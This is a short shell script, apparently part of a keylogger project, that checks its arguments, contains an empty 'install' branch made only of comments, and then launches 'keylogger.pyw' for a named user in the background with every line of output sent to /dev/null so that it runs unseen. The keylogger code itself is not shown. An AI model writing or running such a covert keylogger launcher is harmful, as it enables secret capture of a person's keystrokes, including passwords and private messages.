#!/bin/sh 
if [ $# -lt 1 ]; then
    echo "[ERROR] Invalid usage";
    echo "[INFO] Correct usage: run <user> [install]";
    exit 0;
fi

LOG_INSTALL="false"
if [ $# -ge 2 ]; then
    if [ $2 = "install" ]; then
        LOG_INSTALL="true";
    fi
fi

if [ $LOG_INSTALL == "true" ]; then
  echo "install is true" > /dev/null 2>&1;
#install python
#install python scripts
#ignore output= > /dev/null 2>&1
fi

python3 keylogger.pyw $1 > /dev/null 2>&1 &